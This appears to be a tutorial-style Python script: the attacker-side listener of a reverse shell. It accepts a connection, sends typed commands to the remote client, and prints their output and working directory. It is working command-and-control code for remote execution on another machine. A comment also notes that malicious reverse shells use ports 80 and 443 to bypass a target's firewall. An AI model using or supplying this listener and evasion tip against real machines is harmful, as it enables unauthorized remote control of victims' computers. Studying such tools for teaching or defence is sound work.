

# Notice that I've used 0.0.0.0 as the server IP address, this means all IPv4 addresses on the local machine. You may wonder, why we don't just use our local IP address or localhost or 127.0.0.1 ? Well, if the server has two IP addresses, let's say 192.168.1.101 on a network, and 10.0.1.1 on another, and the server listens on 0.0.0.0, then it will be reachable at both of those IPs.
# We then specified some variables and initiated the TCP socket. Notice I used 5003 as the TCP port, feel free to choose any port above 1024, just make sure it's not used and you should use it on both sides (i.e server and client).
# However, malicious reverse shells usually uses the popular port 80 (i.e http) or 443 (i.e https), this will allow it to bypass firewall restrictions of the target client.

# 0.0.0.0 has a couple of different meanings, but in this context,
# when a server is told to listen on 0.0.0.0 that means 
# "listen on every available network interface".
# The loopback adapter with IP address 127.0.0.1 from the perspective of the server
# process looks just like any other network adapter on the machine, so a server 
# told to listen on 0.0.0.0 will accept connections on that interface too.
import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")


# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)

